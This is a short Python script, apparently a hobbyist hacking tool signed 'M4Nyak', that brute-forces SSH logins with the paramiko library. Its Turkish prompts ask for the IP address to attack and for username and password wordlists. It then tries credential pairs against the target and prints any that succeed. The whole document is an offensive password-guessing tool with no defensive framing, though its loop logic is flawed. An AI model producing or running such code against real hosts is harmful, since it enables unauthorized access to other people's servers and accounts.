print("coded by M4Nyak")


import paramiko
client= paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
ipadresi= str(input("saldiracagin ip adresi: "))
username_list= open(input("usernamelistbelirt"),"r")
pass_list=open(input("passlistbelirt !"),"r")

for i in username_list:
  for j in pass_list:
    try:
      sonuc=client.connect(ipadresi,username=i,password=j)
      client.close()
      print("username:",i, "password=",j)
    except:
      pass
